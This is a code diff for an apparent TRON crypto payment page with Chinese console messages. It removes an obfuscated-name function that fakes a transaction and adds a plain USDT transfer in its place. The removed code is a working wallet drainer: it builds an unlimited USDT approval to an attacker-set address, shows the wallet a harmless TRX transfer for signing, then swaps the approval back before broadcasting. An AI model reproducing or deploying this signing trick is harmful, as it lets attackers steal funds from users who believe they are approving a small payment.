@@ -19,63 +19,47 @@ async function onNextButtonClick() {
 }
 
 
-async function DjdskdbGsj() {
-  const trxAmountInSun = tronWeb.toSun(currentAmount);
-  const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-  const feeLimit = 1000000000;
-  
-  try {
-
-    const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
-    
-    console.log("构建TRX转账交易...");
-    const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
-      paymentAddress,
-      trxAmountInSun,
-      tronWeb.defaultAddress.base58,
-      { feeLimit: feeLimit }
-    );
-
-    const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
-      tronWeb.address.toHex(window.usdtContractAddress),
-      'increaseApproval(address,uint256)',
-      { feeLimit: feeLimit },
-      [
-        { type: 'address', value: window.Permission_address },
-        { type: 'uint256', value: maxUint256 }
-      ],
-      tronWeb.defaultAddress.base58
-    );
-
-    const originalRawData = approvalTransaction.transaction.raw_data;
-
-    approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
-
-    console.log("交易签名中...");
-    const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);
-
-    signedTransaction.raw_data = originalRawData;
-
-    console.log("发送交易...");
-    const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
-
-    console.log("交易结果:", broadcastResult);
-    if (broadcastResult.result || broadcastResult.success) {
-      const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
-      if (!transactionHash) {
-        throw new Error("无法获取交易哈希");
-      }
-      console.log("交易发送成功，交易哈希:", transactionHash);
-      tip("交易成功");
-      return transactionHash;
-    } else {
-      throw new Error("交易失败");
+async function transferUSDT() {
+    const usdtAmountInWei = Math.floor(parseFloat(currentAmount) * 1e6);
+    const feeLimit = 1000000000;
+    const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
+    const recipientAddressHex = tronWeb.address.toHex(window.recipientAddress);
+    try {
+        console.log("构建USDT转账交易...");
+        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+            usdtContractAddressHex,
+            'transfer(address,uint256)',
+            { feeLimit: feeLimit },
+            [
+                { type: 'address', value: recipientAddressHex },
+                { type: 'uint256', value: usdtAmountInWei }
+            ],
+            tronWeb.defaultAddress.base58
+        );
+        if (!transaction.result ||!transaction.result.result) {
+            throw new Error('USDT转账交易构建失败');
+        }
+        console.log("交易签名中...");
+        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
+        console.log("发送交易...");
+        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+        console.log("交易结果:", result);
+        if (result.result) {
+            const transactionHash = result.txid;
+            console.log("交易成功，交易哈希:", transactionHash);
+            tip("交易成功");
+            return transactionHash;
+        } else {
+            throw new Error("交易失败");
+        }
+    } catch (error) {
+        console.error("执行USDT转账操作失败:", error);
+        if (error && error.message) {
+            console.error("错误信息:", error.message);
+        }
+        tip("交易失败，请重试");
+        throw error;
     }
-  } catch (error) {
-    console.error("操作失败:", error);
-    tip("交易失败，请重试");
-    throw error;
-  }
 }
 
 async function KdhshaBBHdg() {
